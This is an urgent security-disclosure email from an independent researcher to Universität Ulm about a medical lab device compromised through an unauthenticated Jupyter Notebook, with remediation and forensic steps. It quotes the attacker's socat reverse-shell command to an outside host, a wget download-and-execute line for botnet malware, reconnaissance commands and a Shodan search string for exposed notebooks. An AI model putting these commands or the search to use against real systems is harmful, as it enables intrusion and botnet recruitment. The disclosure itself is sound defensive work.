---
to: it-sicherheit@uni-ulm.de
cc: kiz@uni-ulm.de, dfn-cert@dfn-cert.de, abuse@nuclide-research.com
severity: CRITICAL
ip: 134.60.110.66
institution: Universität Ulm Medical Faculty (labdevice.medizin.uni-ulm.de), ACTIVE COMPROMISE, attacker reverse shell still running
status: DRAFT
outcome: sent
date: 2026-05-06
---

**To:** it-sicherheit@uni-ulm.de
**Cc:** kiz@uni-ulm.de, dfn-cert@dfn-cert.de, abuse@nuclide-research.com
**Subject:** URGENT, ACTIVE COMPROMISE on labdevice.medizin.uni-ulm.de (134.60.110.66): unauthenticated Jupyter Notebook → attacker reverse shell to 172.233.96.208:3053 still running

---

Nicholas Michael Kloster / NuClide Research
nicholas@nuclide-research.com

2026-05-06

**URGENT**, active attacker compromise on a medical-faculty research device

**Affected host:** `134.60.110.66` (rDNS `labdevice.medizin.uni-ulm.de`)
**Severity:** CRITICAL, active reverse shell to attacker C2 at the time of writing

---

I'm an independent security researcher conducting good-faith AI infrastructure research under the NuClide Research umbrella (CISA disclosures CVE-2025-4364, ICSA-25-140-11). This is an unsolicited urgent-disclosure notification.

A `labdevice.medizin.uni-ulm.de` host has been compromised through an unauthenticated Jupyter Notebook. An attacker has installed an active reverse shell that is currently beaconing to `172.233.96.208:3053`. The attacker first attempted to install Hilix botnet malware on 2026-04-29, failed because the binary was x86_64 and the device is ARM, then returned 2026-05-05 with a socat-based reverse shell that is still running as of probe at 2026-05-07 02:00 UTC.

## Confirmed exposure (verification was non-destructive)

`134.60.110.66:8888` runs Jupyter Notebook 6.5.7 with no authentication required. `GET /api/contents/` returns the notebook root listing without credentials.

### File: `/home/labuser/TPC3.ipynb` (modified 2026-05-05 17:14:38 UTC)

```python
import subprocess
subprocess.Popen('/usr/bin/socat exec:"bash -li",pty,stderr,setsid,sigint,sane tcp:172.233.96.208:3053', shell=True)
```

`/api/sessions` confirms a Python kernel is currently running this notebook. Kernel ID `12e7ce62`, last_activity `2026-05-06 17:07:36 UTC`. The `Popen` returncode is `None`, the socat process is still alive.

### File: `/home/labuser/Untitled.ipynb` (modified 2026-04-29, 13 cells)

Cells 1–11 show the attacker's earlier reconnaissance + first malware attempt:

- `cat /etc/passwd` → succeeded; revealed `labuser` is the Jupyter user
- `whoami` → `labuser`
- `cat /etc/shadow` → permission denied (good, labuser is non-root)
- `sudo -l` → revealed labuser has NOPASSWD sudo for `/usr/bin/tee /var/run/spike-*`, `/bin/rm /var/run/spike-*`, `/bin/systemctl restart cl-analyser`, `/usr/bin/fw_printenv`, `/usr/sbin/periodic-recording-on/off/period`
- `wget http://38.87.117.84/Hilix.x86_64 -O x86_64; chmod +x x86_64; ./x86_64 jupiter; rm x86_64`
   - Downloaded successfully (109 KB)
   - Failed to execute: `Exec format error` (the binary is x86_64 ELF; the CL1-2544-043 device is ARM)
   - Cleaned up, `rm x86_64`

### `/home/labuser/system.json` confirms the device class

```
sys_id: CL1-2544-043
adc_zero_dead_band, dac_step_size_table_values, dac_positive/negative_trim_values
```

Cocoa Labs CL1 series neural amplifier, embedded ARM Linux medical research instrument.

## Attacker infrastructure (for blocklisting)

| Role | Host | rDNS | Provider | Action |
|---|---|---|---|---|
| **Active C2 (reverse-shell receiver)** | `172.233.96.208:3053` | `172-233-96-208.ip.linodeusercontent.com` | Akamai/Linode US | Disclosure sent to `abuse@akamai.com` + `abuse@linode.com` separately |
| **Malware distribution (Hilix)** | `38.87.117.84` | `velonodes.in` | Cogent Communications / DATALIX | Disclosure being sent to `abuse@cogentco.com` |

The C2 nginx default page on port 80 (`Welcome to nginx!`) is decoy traffic; the actual C2 listener is on port 3053 (filtered against scanner IPs).

## Immediate remediation (priority order)

**1. KILL THE ACTIVE REVERSE SHELL, kernel id `12e7ce62`:**

```bash
# On the lab device — stop Jupyter and kill the orphaned socat:
sudo systemctl stop jupyter   # or whatever service runs it
ps -ef | grep socat
sudo pkill -9 -f 'socat.*172.233.96.208'
```

**2. Add Jupyter authentication immediately:**

```bash
# Generate a token and require it:
jupyter notebook password
# Or in the Jupyter config: c.NotebookApp.token = '<random>'
# And bind to localhost — Jupyter on a public interface is rarely the right deployment:
jupyter notebook --ip 127.0.0.1 --no-browser
# Use SSH tunneling for remote access.
```

**3. Audit for persistence:**

- `cat /home/labuser/.bash_history`, what did the socat shell do?
- `crontab -u labuser -l` and `cat /etc/cron.*/* | grep -E 'wget|curl|http'`, scheduled callbacks?
- `cat /home/labuser/.ssh/authorized_keys`, SSH backdoor?
- `find /tmp /var/tmp /dev/shm -type f -mtime -10 -ls`, recently-dropped binaries?
- `ls -la /home/labuser/.config/systemd/user/`, user-level systemd persistence?
- `last labuser` and `who`, current sessions

**4. Verify the cl-analyser daemon and spike data hasn't been tampered:**

The attacker's `sudo -l` recon revealed the labuser has rights to write `/var/run/spike-*` and restart `cl-analyser`. Audit:

- `sudo journalctl -u cl-analyser --since '2 weeks ago'`, service restarts?
- `find /var/run/spike-* -type f -newer /tmp/<reference> -ls`, modified spike data files?
- Verify the lab's recorded electrophysiology data integrity against any backup or upstream archive

**5. Forensic preservation:**

Before remediation, snapshot the live state for forensics:
- `ps -ef > /tmp/process-snapshot.txt`
- `ss -tnap > /tmp/network-snapshot.txt` (the socat connection should be visible)
- `lsof -p <socat-pid>` for the file/socket handles
- Image the disk if available before pkill (the running process state is otherwise lost)

## Threat-class assessment

This is **commodity botnet activity** (Hilix is a Mirai-derivative IoT botnet), not a targeted attack against medical research. The attacker scans for unauthenticated Jupyter Notebooks on port 8888 and drops platform-appropriate payloads. The 6-day delay between the failed x86_64 attempt and the successful socat reverse shell suggests semi-automated reconnaissance + manual follow-up.

The risk is not data exfiltration of medical research per se, it's:
- Use of the device as a pivot into the uni-ulm.de network
- Botnet recruitment (DDoS / proxy infrastructure)
- Lateral movement to other lab devices on the same network segment
- Disruption of the cl-analyser daemon and recorded spike data via the labuser sudo rules

## Reference

Full case study (this is condensed from the post-disclosure NuClide writeup):
https://github.com/Nicholas-Kloster/AI-LLM-Infrastructure-OSINT/blob/main/case-studies/commercial/multi-uni-ulm-jupyter-compromise-2026-05-06.md

Original Shodan dork that surfaced the host: `http.title:"Home Page - Select or create a notebook"`, token-disabled Jupyter classic UI

I am available for verification, additional forensic detail, or to extract additional kernel-state evidence before remediation if useful for incident response. Given the active C2 connection, expedited remediation is requested.

Regards,
Nicholas Michael Kloster / NuClide Research
nicholas@nuclide-research.com
https://github.com/Nicholas-Kloster/AI-LLM-Infrastructure-OSINT
